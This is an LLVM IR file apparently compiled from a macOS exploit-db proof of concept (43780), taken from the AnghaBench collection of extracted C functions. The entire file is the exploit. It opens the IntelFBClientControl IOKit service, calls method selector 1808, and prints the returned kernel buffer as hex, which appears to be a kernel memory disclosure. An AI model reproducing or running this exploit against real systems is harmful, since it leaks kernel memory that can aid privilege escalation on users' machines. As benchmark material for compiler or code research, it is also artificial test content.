; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_43780.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_43780.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [21 x i8] c"IntelFBClientControl\00", align 1
@IO_OBJECT_NULL = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [24 x i8] c"unable to find service\0A\00", align 1
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [38 x i8] c"unable to get user client connection\0A\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"%016llx\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca [16 x i32], align 16
  %10 = alloca i32, align 4
  %11 = alloca [4096 x i8], align 16
  %12 = alloca i64, align 8
  %13 = alloca [16 x i32], align 16
  %14 = alloca i32, align 4
  %15 = alloca [4096 x i8], align 16
  %16 = alloca i64, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32*, align 8
  %19 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %20 = load i32, i32* @kIOMasterPortDefault, align 4
  %21 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0))
  %22 = call i64 @IOServiceGetMatchingService(i32 %20, i32 %21)
  store i64 %22, i64* %7, align 8
  %23 = load i64, i64* %7, align 8
  %24 = load i64, i64* @IO_OBJECT_NULL, align 8
  %25 = icmp eq i64 %23, %24
  br i1 %25, label %26, label %28

26:                                               ; preds = %2
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %75

28:                                               ; preds = %2
  %29 = load i32, i32* @MACH_PORT_NULL, align 4
  store i32 %29, i32* %8, align 4
  %30 = load i64, i64* %7, align 8
  %31 = call i32 (...) @mach_task_self()
  %32 = call i64 @IOServiceOpen(i64 %30, i32 %31, i32 0, i32* %8)
  store i64 %32, i64* %6, align 8
  %33 = load i64, i64* %6, align 8
  %34 = load i64, i64* @KERN_SUCCESS, align 8
  %35 = icmp ne i64 %33, %34
  br i1 %35, label %36, label %38

36:                                               ; preds = %28
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %75

38:                                               ; preds = %28
  store i32 0, i32* %10, align 4
  store i64 8, i64* %12, align 8
  %39 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %40 = bitcast i8* %39 to i32*
  store i32 305419896, i32* %40, align 16
  store i32 0, i32* %14, align 4
  store i64 4096, i64* %16, align 8
  %41 = load i32, i32* %8, align 4
  %42 = getelementptr inbounds [16 x i32], [16 x i32]* %9, i64 0, i64 0
  %43 = load i32, i32* %10, align 4
  %44 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %45 = load i64, i64* %12, align 8
  %46 = getelementptr inbounds [16 x i32], [16 x i32]* %13, i64 0, i64 0
  %47 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 0
  %48 = call i64 @IOConnectCallMethod(i32 %41, i32 1808, i32* %42, i32 %43, i8* %44, i64 %45, i32* %46, i32* %14, i8* %47, i64* %16)
  store i64 %48, i64* %6, align 8
  %49 = load i64, i64* %16, align 8
  %50 = icmp ugt i64 %49, 20
  br i1 %50, label %51, label %74

51:                                               ; preds = %38
  %52 = load i64, i64* %16, align 8
  %53 = sub i64 %52, 7
  %54 = udiv i64 %53, 8
  %55 = trunc i64 %54 to i32
  store i32 %55, i32* %17, align 4
  %56 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 0
  %57 = getelementptr inbounds i8, i8* %56, i64 7
  %58 = bitcast i8* %57 to i32*
  store i32* %58, i32** %18, align 8
  store i32 0, i32* %19, align 4
  br label %59

59:                                               ; preds = %70, %51
  %60 = load i32, i32* %19, align 4
  %61 = load i32, i32* %17, align 4
  %62 = icmp slt i32 %60, %61
  br i1 %62, label %63, label %73

63:                                               ; preds = %59
  %64 = load i32*, i32** %18, align 8
  %65 = load i32, i32* %19, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i32, i32* %64, i64 %66
  %68 = load i32, i32* %67, align 4
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i32 %68)
  br label %70

70:                                               ; preds = %63
  %71 = load i32, i32* %19, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %19, align 4
  br label %59

73:                                               ; preds = %59
  br label %74

74:                                               ; preds = %73, %38
  store i32 0, i32* %3, align 4
  br label %75

75:                                               ; preds = %74, %36, %26
  %76 = load i32, i32* %3, align 4
  ret i32 %76
}

declare dso_local i64 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @IOServiceOpen(i64, i32, i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i64 @IOConnectCallMethod(i32, i32, i32*, i32, i8*, i64, i32*, i32*, i8*, i64*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
